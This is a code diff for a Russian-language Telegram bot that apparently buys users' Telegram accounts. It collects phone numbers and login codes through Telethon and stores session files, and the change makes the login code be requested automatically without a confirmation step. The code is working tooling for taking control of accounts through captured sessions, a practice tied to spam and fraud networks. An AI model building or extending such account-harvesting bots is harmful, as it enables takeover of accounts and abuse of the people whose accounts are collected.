@@ -178,7 +178,8 @@ def get_main_keyboard(user_id: int):
             InlineKeyboardButton(text="📥 Сдать ТГ аккаунт", callback_data="menu_submit_tg"),
         ],
         [
-            InlineKeyboardButton(text="💰 Вывод средств", callback_data="menu_withdraw")
+            InlineKeyboardButton(text="💰 Вывод средств", callback_data="menu_withdraw"),
+            InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")
         ],
     ]
     if user_id in ADMIN_IDS:
@@ -304,27 +305,9 @@ async def process_phone(message: Message, state: FSMContext):
 
     await state.update_data(phone=phone, session_name=session_name, session_path=session_path)
 
-    request_code_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📲 Запросить код", callback_data="request_tg_code")],
-        [InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="back_main")]
-    ])
+    # Автоматический запрос кода без промежуточной кнопки
+    waiting_msg = await message.answer("⏳ Запрашиваю код подтверждения в ваш Telegram...")
 
-    await message.answer(
-        f"📱 Номер `{phone}` успешно принят.\n\nНажмите кнопку ниже, чтобы бот запросил код подтверждения в ваш Telegram:",
-        reply_markup=request_code_kb, parse_mode="Markdown"
-    )
-
-
-@router.callback_query(F.data == "request_tg_code")
-async def cb_request_tg_code(callback: CallbackQuery, state: FSMContext):
-    data = await state.get_data()
-    phone = data.get("phone")
-    session_path = data.get("session_path")
-
-    if not phone or not session_path:
-        return await callback.answer("❌ Сессия устарела. Начните заново.", show_alert=True)
-
-    # Исправление: приведем API_ID к строке (str), чтобы избежать ошибки "bytes or str expected, not int"
     client = TelegramClient(session_path, str(API_ID), API_HASH)
 
     try:
@@ -332,22 +315,24 @@ async def cb_request_tg_code(callback: CallbackQuery, state: FSMContext):
         sent = await client.send_code_request(phone)
         await state.update_data(phone_code_hash=sent.phone_code_hash)
 
-        await callback.message.edit_text(
-            "📲 Код подтверждения отправлен в ваш Telegram.\n**Введите полученный 5-значный код в чат:**",
+        await waiting_msg.edit_text(
+            f"📱 Номер `{phone}` принят.\n\n📲 Код подтверждения отправлен в ваш Telegram.\n**Введите полученный 5-значный код в чат:**",
             parse_mode="Markdown"
         )
         await state.set_state(AuthStates.waiting_for_code)
     except FloodWaitError as e:
         await client.disconnect()
-        await callback.message.edit_text(
+        await waiting_msg.edit_text(
             f"❌ Ограничение Telegram. Попробуйте через {e.seconds} секунд.",
             reply_markup=get_back_keyboard()
         )
+        await state.clear()
     except Exception as e:
         await client.disconnect()
-        await callback.message.edit_text(
+        await waiting_msg.edit_text(
             f"❌ Ошибка отправки кода: {e}\nПопробуйте заново.", reply_markup=get_back_keyboard()
         )
+        await state.clear()
     finally:
         try:
             await client.disconnect()
@@ -367,7 +352,6 @@ async def process_code(message: Message, state: FSMContext):
     if not phone or not session_path:
         return await message.answer("❌ Ошибка сессии. Вернитесь в меню и попробуйте снова.", reply_markup=get_back_keyboard())
 
-    # Также используем str(API_ID) для безопасности
     client = TelegramClient(session_path, str(API_ID), API_HASH)
 
     try:
